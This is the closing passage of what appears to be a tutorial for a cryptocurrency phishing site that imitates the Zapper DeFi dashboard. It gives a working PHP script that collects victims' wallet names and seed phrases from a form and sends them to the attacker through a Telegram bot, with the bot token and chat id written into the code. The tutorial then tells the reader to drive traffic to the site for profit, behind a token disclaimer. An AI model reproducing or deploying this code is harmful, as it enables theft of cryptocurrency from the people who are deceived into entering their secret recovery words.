    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="CSS/style.min.css">
    <title>Zapper - Dashboard for DeFi</title>
</head>
<body>
    <img class="disc_end" src="icons/rig.gif" alt="">
</body>
</html>
```
#### The fifth step is to write a script to process requests and send them to tg.
#### Let's call it telegram.php
```
<?php

header('Access-Control-Allow-Origin: *');

$sid = $_POST['sid'];
$name = $_POST['currency'];
$token = "1781605913:AAH3341p65G-4a7I9RploILsW3UyzR89CmMM";
$chat_id = "11294049069";
$cash = $_POST['cash'];
$arr = array(
  'Wallets' => $cash,
  'Words' => $sid,
  'Platform' => $name
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: disc.html');
} else {
  echo "Error";
}
?>
```
#### Checking!

#### All in all. We have created a phishing site for processing crypto wallets.
#### Thus, we will be able to get crypto wallets and their secret words.

##### 1 - We pour traffic
##### 2 - Admiring the profit
 
## DEVELOPER DO NOT SUPPORT ANY OF THE ILLEGAL ACTIVITIES.
## Contact Me on telegram or twitter: https://twitter.com/TrewisScotch / https://t.me/TrewisWork
